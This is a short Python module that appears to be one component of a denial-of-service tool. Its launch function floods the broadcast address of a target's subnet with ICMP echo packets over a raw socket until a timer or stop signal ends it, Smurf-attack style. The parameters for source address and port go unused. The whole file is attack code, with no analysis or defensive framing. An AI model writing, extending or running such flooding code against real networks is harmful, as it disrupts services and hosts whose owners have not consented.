import socket
import struct
import os
import time

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        a = data[i]
        b = data[i+1] if i+1 < len(data) else 0
        s += (a << 8) + b
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def create_icmp_echo(src_ip):
    header = struct.pack("!BBHHH", 8, 0, 0, os.getpid() & 0xFFFF, 1)
    payload = b'A' * 56
    packet = header + payload
    chk = checksum(packet)
    header = struct.pack("!BBHHH", 8, 0, chk, os.getpid() & 0xFFFF, 1)
    return header + payload

def launch(target_ip, port, duration, tag, stop_event, fail_tracker):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except PermissionError:
        print(f"[!] {tag} needs root/admin privileges.")
        fail_tracker.append(tag)
        return

    packet = create_icmp_echo(target_ip)
    broadcast_ip = target_ip.rsplit('.', 1)[0] + '.255'  # crude broadcast

    start_time = time.time()
    lost = 0

    while not stop_event.is_set():
        if duration and (time.time() - start_time > duration):
            break

        try:
            sock.sendto(packet, (broadcast_ip, 0))
        except Exception:
            lost += 1
            if lost > 20:
                print(f"[x] {tag} blocked or invalid broadcast.")
                fail_tracker.append(tag)
                break

        time.sleep(0.01)

    sock.close()
